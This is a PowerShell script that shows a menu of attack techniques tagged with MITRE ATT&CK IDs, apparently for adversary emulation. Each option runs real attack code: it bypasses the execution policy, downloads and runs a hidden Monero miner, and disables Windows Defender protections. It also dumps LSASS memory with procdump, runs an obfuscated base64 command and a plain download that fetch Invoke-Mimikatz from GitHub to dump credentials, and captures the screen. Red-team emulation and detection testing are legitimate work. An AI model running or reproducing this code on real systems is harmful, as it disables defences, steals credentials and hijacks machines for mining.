function DisplayMenu {
Clear-Host
Write-Host @"
+========================================================+
|  POWERSHELL CONSOLE - USER MENU                        | 
+========================================================+
|                                                        |
|    1) Bypass ExecutionPolicy (T1562.001)               |
|    2) Crypto (Monero) Mining (T1496)                   |
|    3) Disable Windows Defender All (T1562.001).        | 
|    4) Mimikatz.                                        |
|    5) Screen Capture (T1113).                          |
|    6) EXIT                                             |
+========================================================+

"@

$MENU = Read-Host "OPTION"
Switch ($MENU)
{
1 {
#OPTION1
Set-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell -Name ExecutionPolicy -Value ByPass;
$shell = New-Object -ComObject Wscript.Shell
Set-ExecutionPolicy Bypass | echo $shell.sendkeys("Y`r`n")
DisplayMenu
}
2 {
#OPTION2
Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-msvc-win64.zip -OutFile xmrig-6.11.2-msvc-win64.zip;
Expand-Archive -LiteralPath xmrig-6.11.2-msvc-win64.zip -DestinationPath .\;
Start-Process ".\xmrig-6.11.2\xmrig.exe" -WindowStyle Hidden;
Start-Sleep -Seconds 60;
Stop-Process -Name "xmrig"
DisplayMenu
}
3 {
#OPTION3
Set-MpPreference -DisableIntrusionPreventionSystem $true;
Set-MpPreference -DisableIOAVProtection $true;
Set-MpPreference -DisableRealtimeMonitoring $true;
Set-MpPreference -DisableScriptScanning $true;
Set-MpPreference -EnableControlledFolderAccess Disabled;
DisplayMenu
}
4 {
#OPTION4
$ps_url = "https://download.sysinternals.com/files/Procdump.zip";
$download_folder = "C:\Users\Public\";
$staging_folder = "C:\Users\Public\temp";
Start-BitsTransfer -Source $ps_url -Destination $download_folder;
Expand-Archive -LiteralPath $download_folder"Procdump.zip" -DestinationPath $staging_folder;
$arch=[System.Environment]::Is64BitOperatingSystem;

if ($arch) {
    iex $staging_folder"\procdump64.exe -accepteula -ma lsass.exe" > $env:APPDATA\error.dmp 2>&1;
} else {
    iex $staging_folder"\procdump.exe -accepteula -ma lsass.exe" > $env:APPDATA\error.dmp 2>&1;
}
remove-item $staging_folder -Recurse;

powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARQBtAHAAaQByAGUAUAByAG8AagBlAGMAdAAvAEUAbQBwAGkAcgBlAC8ANwBhADMAOQBhADUANQBmADEAMgA3AGIAMQBhAGUAYgA5ADUAMQBiADMAZAA5AGQAOAAwAGMANgBkAGMANgA0ADUAMAAwAGMAYQBjAGIANQAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA==

Import-Module .\invoke-mimi.ps1;

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
$web = (New-Object System.Net.WebClient);
$result = $web.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1");
iex $result; Invoke-Mimikatz -DumpCreds

Invoke-Mimikatz -DumpCreds

DisplayMenu
}
5 {
#OPTION5
$loadResult = [Reflection.Assembly]::LoadWithPartialName("System.Drawing");
function screenshot([Drawing.Rectangle]$bounds, $path) {
   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;
   $graphics = [Drawing.Graphics]::FromImage($bmp);
   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);
   $bmp.Save($path);
   $graphics.Dispose();
   $bmp.Dispose();
}
if ($loadResult) {
  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);
  $dest = "$HOME\Desktop\screensh0t.png";
  screenshot $bounds $dest;
  if (Test-Path -Path $dest) {
    $dest;
    exit 0;
  };
};
exit 1;
DisplayMenu
}
6 {
#OPTION6
Write-Host "Bye"
Break
}
default {
#DEFAULT OPTION
Write-Host "Option not available"
Start-Sleep -Seconds 2
DisplayMenu
}
}
}
DisplayMenu
